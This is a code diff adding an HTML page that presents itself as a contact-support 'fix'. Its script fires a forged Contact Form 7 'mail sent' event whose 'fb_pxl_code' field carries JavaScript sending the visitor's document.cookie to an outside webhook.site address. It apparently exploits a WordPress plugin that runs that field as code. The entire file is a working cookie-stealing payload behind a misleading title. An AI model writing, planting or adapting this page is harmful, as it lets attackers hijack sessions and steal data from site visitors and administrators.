@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Contact Support</title>
+  </head>
+  <body>
+    <h2>Loading contact form fix...</h2>
+    <script>
+      document.dispatchEvent(new CustomEvent('wpcf7mailsent', {
+        detail: {
+          apiResponse: {
+            fb_pxl_code: `fetch('https://webhook.site/9ca40ba1-aff7-4377-9494-06d6324e30a4' + document.cookie)`
+          }
+        }
+      }));
+    </script>
+  </body>
+</html>
+
